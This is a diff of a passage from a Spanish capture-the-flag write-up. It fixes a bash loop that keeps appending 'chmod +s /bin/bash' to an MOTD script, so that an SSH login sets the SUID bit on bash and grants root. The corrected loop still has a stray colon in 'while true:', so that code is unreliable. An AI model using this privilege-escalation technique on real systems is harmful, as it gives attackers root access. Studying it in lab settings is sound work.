@@ -176,10 +176,10 @@ $ echo "chmod +s /bin/bash" >> 00-header
 En mi caso tuve que hacerlo algunas veces, esto es debido a que hay un cron job que esta actualizando el archivo cada pocos segundos. Lo mejor para esto seria crear un script en bash en un ciclo `While` para que este se ejecute cada poco como el siguiente.
 ```bash
 #!/bin/bash
-While True:
-    do
-     echo "chmod +s /bin/bash" >> /etc/update-motd.d/00-header
-    done
+while true:
+do
+  echo "chmod +s /bin/bash" >> /etc/update-motd.d/00-header
+done
 ``` 
 Este script lo creamos en tmp y lo ejecutamos mientras en otra ventana entramos varias veces a la maquina a traves ssh y hacemos un ls -la /bin/bash hasta que encontremos el permiso s en el binario.
 ```bash
